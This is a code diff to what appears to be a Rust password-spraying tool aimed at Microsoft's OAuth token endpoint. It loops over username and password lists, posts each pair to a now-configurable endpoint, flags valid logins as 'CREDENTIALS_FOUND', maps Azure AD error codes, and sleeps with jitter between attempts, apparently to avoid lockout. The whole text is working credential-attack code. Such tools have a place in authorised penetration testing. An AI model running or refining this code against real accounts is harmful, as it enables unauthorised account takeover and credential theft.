@@ -21,6 +21,7 @@ use structs::{BadRequest, Foo};
 
 fn send_request(
     client: Client,
+    endpoint: String,
     username: String,
     password: String,
     resource_principal: String,
@@ -36,7 +37,7 @@ fn send_request(
         username=username,
     );
     let response = client
-        .get("https://login.microsoft.com/common/oauth2/token")
+        .post(endpoint)
         .header(reqwest::header::ACCEPT, "application/json")
         .header(
             reqwest::header::CONTENT_TYPE,
@@ -54,8 +55,10 @@ fn parse_response(response: Response) -> Foo {
 
     match response.status() {
         StatusCode::OK => {
+            trace!("HTTP body: {}", response.text().unwrap());
+
             return Foo {
-                code: None,
+                error_code: None,
                 message: "CREDENTIALS_FOUND",
                 r#type: "SUCCESS",
             };
@@ -66,25 +69,22 @@ fn parse_response(response: Response) -> Foo {
             trace!("JSON body: {:#?}", json_body);
 
             for entry in ERROR_CODES {
-                let index = json_body.error_description.find(entry.code.unwrap());
-
-                if index != None {
+                if entry.error_code.unwrap() == json_body.error_codes[0] {
                     return entry;
                 }
             }
 
             return Foo {
-                // code: json_body.error_description.filer(AADSOMETHING),
-                code: None,
-                // message: format!("UNHANDLED_EXCEPTION (ERROR_CODE: <b>{}</b>)", json_body.error_description),
+                error_code: Some(json_body.error_codes[0]),
+                // message: format!("UNHANDLED_EXCEPTION (ERROR_CODE:<b>{}</b>)", json_body.error_codes[0]),
                 message: "UNHANDLED_EXCEPTION (<b>ERROR_CODE</b>)",
                 r#type: "ERROR",
             };
         }
         _ => {
             return Foo {
-                code: None,
-                // message: format!("UNHANDLED_EXCEPTION (ERROR_CODE: <b>{}</b>)", response.status()),
+                error_code: None,
+                // message: format!("UNHANDLED_EXCEPTION (ERROR_CODE:<b>{}</b>)", response.status()),
                 message: "UNHANDLED_EXCEPTION (<b>HTTP_STATUS</b>)",
                 r#type: "ERROR",
             };
@@ -134,8 +134,9 @@ fn main() -> Result<()> {
     let mut username_buf_reader = BufReader::new(File::open(args.username)?);
     let mut password_buf_reader = BufReader::new(File::open(args.password)?);
 
+    let total_passwords_count = password_buf_reader.by_ref().lines().count();
     let total_candidates_count =
-        username_buf_reader.by_ref().lines().count() * password_buf_reader.by_ref().lines().count();
+        username_buf_reader.by_ref().lines().count() * total_passwords_count;
 
     info!(
         "Saving output to: <b>{}</>",
@@ -143,6 +144,7 @@ fn main() -> Result<()> {
     );
 
     let mut i: u128 = 1;
+    let mut j: u128 = 1;
 
     password_buf_reader.seek(SeekFrom::Start(0))?;
 
@@ -160,15 +162,22 @@ fn main() -> Result<()> {
 
             let result: Foo = parse_response(send_request(
                 client.clone(),
+                args.endpoint.clone(),
                 username.clone(),
                 password.clone(),
-                args.resource_principal.to_string(),
+                args.resource_principal.clone(),
             ));
 
             let mut success = false;
             let formatted_output = format!(
-                "[<b>{}/{}</>] [<cyan>{}</>] {}:{}",
-                i, total_candidates_count, args.resource_principal, username, password
+                "[cand:<b>{}/{}</>] [passwd:<b>{}/{}</>] [<cyan>{}</>] {}:{}",
+                i,
+                total_candidates_count,
+                j,
+                total_passwords_count,
+                args.resource_principal,
+                username,
+                password
             );
 
             match result.r#type {
@@ -199,6 +208,8 @@ fn main() -> Result<()> {
 
             thread::sleep(Duration::from_secs(args.delay + jitter));
         }
+
+        j += 1;
     }
 
     Ok(())
